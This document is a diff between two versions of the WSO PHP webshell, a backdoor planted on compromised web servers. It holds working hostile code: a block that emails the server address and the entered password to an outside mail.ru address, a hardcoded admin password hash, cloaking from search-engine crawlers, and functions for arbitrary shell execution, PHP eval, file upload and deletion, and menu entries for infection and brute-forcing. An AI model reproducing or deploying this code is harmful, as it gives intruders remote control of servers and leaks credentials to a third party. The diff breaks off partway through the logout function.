@@ -1,19 +1,19 @@
 <?php
 //--------------Watching webshell!--------------
 if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('hard_linux@mail.ru', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$â–› = "0e58066e99df5e1e1ff8f2662c5b7d7e "; // root
-$â–˜ = true;
-$â–œ = 'UTF-8';
-$â–š = 'FilesMan';
-$â–™ = md5($_SERVER['HTTP_USER_AGENT']);
+$▛ = "21232f297a57a5a743894a0e4a801fc3"; //admin
+$▘ = true;
+$▜ = 'UTF-8';
+$▚ = 'FilesMan';
+$▙ = md5($_SERVER['HTTP_USER_AGENT']);
 if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
-	prototype(md5($_SERVER['HTTP_HOST'])."key", $â–™);
+	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
 }
 if(empty($_POST['charset']))
-	$_POST['charset'] = $â–œ;
+	$_POST['charset'] = $▜;
 if (!isset($_POST['ne'])) {
 	if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
 	if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
@@ -26,10 +26,9 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
-if(version_compare(PHP_VERSION, '5.3.0', '<')){
-    set_magic_quotes_runtime(0);
-}
-@define('VERSION', '4.2.6');
+if (PHP_VERSION_ID < 70000)
+	@set_magic_quotes_runtime(0);
+@define('VERSION', '4.2.5');
 if(get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -37,15 +36,15 @@ if(get_magic_quotes_gpc()) {
 	$_POST = stripslashes_array($_POST);
     $_COOKIE = stripslashes_array($_COOKIE);
 }
-/* (Ð¡) 11.2011 oRb */
-if(!empty($â–›)) {
-    if(isset($_POST['pass']) && (md5($_POST['pass']) == $â–›))
-        prototype(md5($_SERVER['HTTP_HOST']), $â–›);
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $â–›))
+/* (С) 11.2011 oRb */
+if(!empty($▛)) {
+    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
+        prototype(md5($_SERVER['HTTP_HOST']), $▛);
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
         hardLogin();
 }
 if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
-    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$â–˜;
+    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
 function hardLogin() {
 		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
@@ -54,9 +53,7 @@ function hardLogin() {
 		  exit;
 		  }
 		}
-	die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'></center><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
-<div class='view'><div class='plane main'><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div><div class='circle'></div></div></div>
-<style>body,html{background:#1a1a1a;overflow:hidden;width:100%;height:100%;position:absolute;z-index: -2;}.view{position:absolute;top:0;left:0;right:0;bottom:0;-webkit-perspective:400;perspective:400;z-index: -2;}.plane{width:120px;height:120px;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;position:absolute;z-index: -2;}.plane.main{position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;-webkit-transform:rotateX(60deg) rotateZ(-30deg);transform:rotateX(60deg) rotateZ(-30deg);-webkit-animation:rotate 20s infinite linear;animation:rotate 20s infinite linear;z-index: -2;}.plane.main .circle{width:120px;height:120px;position:absolute;-webkit-transform-style:preserve-3d;transform-style:preserve-3d;border-radius:100%;box-sizing:border-box;box-shadow:0 0 60px #a10705,inset 0 0 60px #7a0000;z-index: -2;}.plane.main .circle::after,.plane.main .circle::before{content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;margin:auto;width:5%;height:5%;border-radius:100%;background:#5d0819;box-sizing:border-box;box-shadow:0 0 60px 2px #7a0000;z-index: -2;}.plane.main .circle::before{-webkit-transform:translateZ(-90px);transform:translateZ(-90px)}.plane.main .circle::after{-webkit-transform:translateZ(90px);transform:translateZ(90px)}.plane.main .circle:nth-child(1){-webkit-transform:rotateZ(72deg) rotateX(63.435deg);transform:rotateZ(72deg) rotateX(63.435deg)}.plane.main .circle:nth-child(2){-webkit-transform:rotateZ(144deg) rotateX(63.435deg);transform:rotateZ(144deg) rotateX(63.435deg)}.plane.main .circle:nth-child(3){-webkit-transform:rotateZ(216deg) rotateX(63.435deg);transform:rotateZ(216deg) rotateX(63.435deg)}.plane.main .circle:nth-child(4){-webkit-transform:rotateZ(288deg) rotateX(63.435deg);transform:rotateZ(288deg) rotateX(63.435deg)}.plane.main .circle:nth-child(5){-webkit-transform:rotateZ(360deg) rotateX(63.435deg);transform:rotateZ(360deg) rotateX(63.435deg)}@-webkit-keyframes rotate{0%{-webkit-transform:rotateX(0) rotateY(0) rotateZ(0);transform:rotateX(0) rotateY(0) rotateZ(0)}100%{-webkit-transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg);transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg)}}@keyframes rotate{0%{-webkit-transform:rotateX(0) rotateY(0) rotateZ(0);transform:rotateX(0) rotateY(0) rotateZ(0)}100%{-webkit-transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg);transform:rotateX(360deg) rotateY(360deg) rotateZ(360deg)}}; h2{color:whitesmoke; font-weight:bold; text-decoration:underline;}</style>");
+	die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>");
 }
 if(strtolower(substr(PHP_OS,0,3)) == "win")
 	$os = 'win';
@@ -76,22 +73,20 @@ if($os == 'win') {
 }
 if($cwd[strlen($cwd)-1] != '/')
 	$cwd .= '/';
-/* (Ð¡) 04.2015 Pirat */
+/* (С) 04.2015 Pirat */
 function hardHeader() {
 	if(empty($_POST['charset']))
-		$_POST['charset'] = $GLOBALS['â–œ'];
+		$_POST['charset'] = $GLOBALS['▜'];
 	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
-    <link href='https://fonts.googleapis.com/css?family=Nunito' rel='stylesheet'>
-    <link rel='stylesheet' href='https://cdn.rawgit.com/kimeiga/bahunya/css/bahunya-0.1.3.css'>
 <style>
 	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
 	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
 	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
 	table.info	{color:#C3C3C3;}
 	table#toolsTbl {background-color: #060A10;}
-	span,h1,a	{color:#68b723 !important;}
+	span,h1,a	{color:#fff !important;}
 	span		{font-weight:bolder;}
-	h1			{border-left:5px solid #a10705;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
+	h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
 	div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
 	a			{text-decoration:none;}
 	a:hover		{text-decoration:underline;}
@@ -101,7 +96,7 @@ function hardHeader() {
 	.bigarea	{min-width:100%;max-width:100%;height:400px;}
 	input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
 	label {position:relative}
-	label:after{border-bottom:2px solid #999;border-right:2px solid #999;content:'';display:block;height:5px;margin-top:-4px;pointer-events:none;position:absolute;right:12px;top:50%;-webkit-transform-origin:66% 66%;-ms-transform-origin:66% 66%;transform-origin:66% 66%;-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg);-webkit-transition:all .15s ease-in-out;transition:all .15s ease-in-out;width:5px}
+	label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
 	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
 	form		{margin:0px;}
 	#toolsTbl	{text-align:center;}
@@ -112,10 +107,10 @@ function hardHeader() {
 	.main th	{text-align:left;background-color:#060a10;}
 	.main tr:hover{background-color:#354252;}
 	.main td, th{vertical-align:middle;}
-	input[type='submit']{background-color:#0d52bf; color:#fafafa;}
-	input[type='button']{background-color:#0d52bf; color:#fafafa;}
-	input[type='submit']:hover{background-color:#002e99; color:#fafafa;}
-	input[type='button']:hover{background-color:#002e99; color:#fafafa;}
+	input[type='submit']{background-color:#2E6E9C;}
+	input[type='button']{background-color:#2E6E9C;}
+	input[type='submit']:hover{background-color:#56AD15;}
+	input[type='button']:hover{background-color:#56AD15;}
 	.l1			{background-color:#202832;}
 	pre			{font:9pt Courier New;}
 </style>
@@ -127,6 +122,7 @@ function hardHeader() {
     var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
     var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
     var d = document;
+	
 	function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
 	function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
 	function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
@@ -189,7 +185,7 @@ function hardHeader() {
 	$totalSpace = $totalSpace?$totalSpace:1;
 	$release = @php_uname('r');
 	$kernel = @php_uname('s');
-	$explink = 'http://nullrefer.com/?https://www.exploit-db.com/search/?action=search&description=';
+	$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';
 	if(strpos('Linux', $kernel) !== false)
 		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
 	else
@@ -218,10 +214,10 @@ function hardHeader() {
 	}
 	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
 	$opt_charsets = '';
-	foreach($charsets as $â–Ÿ)
-		$opt_charsets .= '<option value="'.$â–Ÿ.'" '.($_POST['charset']==$â–Ÿ?'selected':'').'>'.$â–Ÿ.'</option>';
+	foreach($charsets as $▟)
+		$opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
 	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
-	if(!empty($GLOBALS['â–›']))
+	if(!empty($GLOBALS['▛']))
 	$m['Logout'] = 'Logout';
 	$m['Self remove'] = 'SelfRemove';
 	$menu = '';
@@ -233,14 +229,14 @@ function hardHeader() {
 		if (is_dir($drive.':\\'))
 			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
 	}
-	/* (Ð¡) 08.2015 dmkcv */
+	/* (С) 08.2015 dmkcv */
 	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
-		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="https://nullrefer.com/?https://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=#a10705>ON</font>':'<font color=#f9c440><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
+		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
 		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
-		 '<table style="background-color:#0d52bf;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
+		 '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
 }
 function hardFooter() {
-	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#f9c440'>[ Writeable ]</font>":" <font color=#a10705>(Not writable)</font>";
+	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#FFDB5F'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
     echo "
 </div>
 <table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
@@ -260,34 +256,34 @@ function hardFooter() {
 		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
 		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
 	</tr></table></div>
-	<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
+	<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
 	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
 	</body></html>";
 }
 if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
 if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }
 function ex($in) {
-	$â–– = '';
+	$▖ = '';
 	if (function_exists('exec')) {
-		@exec($in,$â––);
-		$â–– = @join("\n",$â––);
+		@exec($in,$▖);
+		$▖ = @join("\n",$▖);
 	} elseif (function_exists('passthru')) {
 		ob_start();
 		@passthru($in);
-		$â–– = ob_get_clean();
+		$▖ = ob_get_clean();
 	} elseif (function_exists('system')) {
 		ob_start();
 		@system($in);
-		$â–– = ob_get_clean();
+		$▖ = ob_get_clean();
 	} elseif (function_exists('shell_exec')) {
-		$â–– = shell_exec($in);
+		$▖ = shell_exec($in);
 	} elseif (is_resource($f = @popen($in,"r"))) {
-		$â–– = "";
+		$▖ = "";
 		while(!@feof($f))
-			$â–– .= fread($f,1024);
+			$▖ .= fread($f,1024);
 		pclose($f);
-	}else return "â†³ Unable to execute command\n";
-	return ($â––==''?"â†³ Query did not return anything\n":$â––);
+	}else return "↳ Unable to execute command\n";
+	return ($▖==''?"↳ Query did not return anything\n":$▖);
 }
 function viewSize($s) {
 	if($s >= 1073741824)
@@ -325,7 +321,7 @@ function viewPermsColor($f) {
 	elseif (!@is_writable($f))
 		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
 	else
-		return '<font color=#f9c440><b>'.perms(@fileperms($f)).'</b></font>';
+		return '<font color=#FFDB5F><b>'.perms(@fileperms($f)).'</b></font>';
 }
 function hardScandir($dir) {
     if(function_exists("scandir")) {
@@ -403,19 +399,19 @@ function actionSecInfo() {
                 $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                 echo '<br>';
                 $temp=array();
-                foreach ($userful as $â–Ÿ)
-                    if(which($â–Ÿ))
-                        $temp[] = $â–Ÿ;
+                foreach ($userful as $▟)
+                    if(which($▟))
+                        $temp[] = $▟;
                 showSecParam('Userful', implode(', ',$temp));
                 $temp=array();
-                foreach ($danger as $â–Ÿ)
-                    if(which($â–Ÿ))
-                        $temp[] = $â–Ÿ;
+                foreach ($danger as $▟)
+                    if(which($▟))
+                        $temp[] = $▟;
                 showSecParam('Danger', implode(', ',$temp));
                 $temp=array();
-                foreach ($downloaders as $â–Ÿ)
-                    if(which($â–Ÿ))
-                        $temp[] = $â–Ÿ;
+                foreach ($downloaders as $▟)
+                    if(which($▟))
+                        $temp[] = $▟;
                 showSecParam('Downloaders', implode(', ',$temp));
                 echo '<br/>';
                 showSecParam('HDD space', ex('df -h'));
@@ -558,7 +554,7 @@ function actionFilesTools() {
 					$h[2] .= "\n";
 				}
 		 	}
-			echo '<table cellspacing=1 cellpadding=5 bgcolor=#1a1a1a><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#202832><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
+			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#202832><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
 			break;
 		case 'rename':
 			if( !empty($_POST['p3']) ) {
@@ -582,7 +578,7 @@ function actionFilesTools() {
 			clearstatcache();
 			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="submit"></form>';
 			break;
-		/* (Ð¡) 12.2015 mitryz */
+		/* (С) 12.2015 mitryz */
 		case 'frame':
 			$frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
 			if ($frameSrc[0] != '/')
@@ -719,6 +715,7 @@ function add(cmd) {
 		}
 		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
 	}
+	
 	echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>';
 	if(!empty($_POST['p1'])) {
 		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
@@ -734,7 +731,7 @@ function actionPhp() {
 		eval($_POST['p1']);
 		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
 		echo strlen($temp), "\n", $temp;
-		exit;
+		exit; 
 	}
 	hardHeader();
 	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
@@ -765,6 +762,7 @@ function actionPhp() {
 function actionFilesMan() {
     if (!empty ($_COOKIE['f']))
         $_COOKIE['f'] = @unserialize($_COOKIE['f']);
+    
 	if(!empty($_POST['p1'])) {
 		switch($_POST['p1']) {
 			case 'uploadFile':
@@ -784,15 +782,15 @@ function actionFilesMan() {
 				function deleteDir($path) {
 					$path = (substr($path,-1)=='/') ? $path:$path.'/';
 					$dh  = opendir($path);
-					while ( ($â–Ÿ = readdir($dh) ) !== false) {
-						$â–Ÿ = $path.$â–Ÿ;
-						if ( (basename($â–Ÿ) == "..") || (basename($â–Ÿ) == ".") )
+					while ( ($▟ = readdir($dh) ) !== false) {
+						$▟ = $path.$▟;
+						if ( (basename($▟) == "..") || (basename($▟) == ".") )
 							continue;
-						$type = filetype($â–Ÿ);
+						$type = filetype($▟);
 						if ($type == "dir")
-							deleteDir($â–Ÿ);
+							deleteDir($▟);
 						else
-							@unlink($â–Ÿ);
+							@unlink($▟);
 					}
 					closedir($dh);
 					@rmdir($path);
@@ -946,7 +944,7 @@ echo "<script>
 	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
 	<label><select name='p1'>";
 	if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
-        echo "<option value='paste'>â†³ Paste</option>";
+        echo "<option value='paste'>↳ Paste</option>";
 	echo "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
     if(class_exists('ZipArchive'))
         echo "<option value='zip'>+ zip</option><option value='unzip'>- zip</option>";
@@ -954,7 +952,7 @@ echo "<script>
     echo "</select></label>";
     if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
         echo "&nbsp;file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
-    echo "<input type='submit' value='submit' style='margin-left:10px'></td></tr></form></table></div>";
+    echo "<input type='submit' value='submit'></td></tr></form></table></div>";
 	hardFooter();
 }
 function actionStringTools() {
@@ -1018,13 +1016,13 @@ function actionStringTools() {
 			$path.='/';
 		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
 		if(is_array($paths)&&@count($paths)) {
-			foreach($paths as $â–Ÿ) {
-				if(@is_dir($â–Ÿ)){
-					if($path!=$â–Ÿ)
-						hardRecursiveGlob($â–Ÿ);
+			foreach($paths as $▟) {
+				if(@is_dir($▟)){
+					if($path!=$▟)
+						hardRecursiveGlob($▟);
 				} else {
-					if(empty($_POST['p2']) || @strpos(file_get_contents($â–Ÿ), $_POST['p2'])!==false)
-						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($â–Ÿ)."\", \"view\",\"\")'>".htmlspecialchars($â–Ÿ)."</a><br>";
+					if(empty($_POST['p2']) || @strpos(file_get_contents($▟), $_POST['p2'])!==false)
+						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($▟)."\", \"view\",\"\")'>".htmlspecialchars($▟)."</a><br>";
 				}
 			}
 		}
@@ -1033,10 +1031,15 @@ function actionStringTools() {
 		hardRecursiveGlob($_POST['c']);
 	echo "</div><br><h1>Search for hash:</h1><div class=content>
 		<form method='post' target='_blank' name='hf'>
-			<input type='text' name='hash' style='width:330px;'><br>
-            <input type='hidden' name='act' value='find'/><br>
-			<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\">
-			<input style='margin-left: 20px;' type='submit' value='md5decrypter.com' onclick=\"document.hf.action='https://www.md5decrypter.com/';document.hf.submit()\"><br>
+			<input type='text' name='hash' style='width:200px;'><br>
+            <input type='hidden' name='act' value='find'/>
+			<input type='submit' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
+			<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
+            <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
+			<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
+			<input type='submit' value='toolki.com' onclick=\"document.hf.action='http://toolki.com/';document.hf.submit()\"><br>
+			<input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\"><br>
+			<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
 		</form></div>";
 	hardFooter();
 }
@@ -1094,10 +1097,7 @@ function actionSafeMode() {
 }
 function actionLogout() {
     setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
-	die("<div align='center'><div class='container'><div class='sky'><div class='text'>THANK YOU & BYE</div><div class='stars'></div><div class='stars1'></div><div class='stars2'></div><div class='shooting-stars'></div></div></div></div>
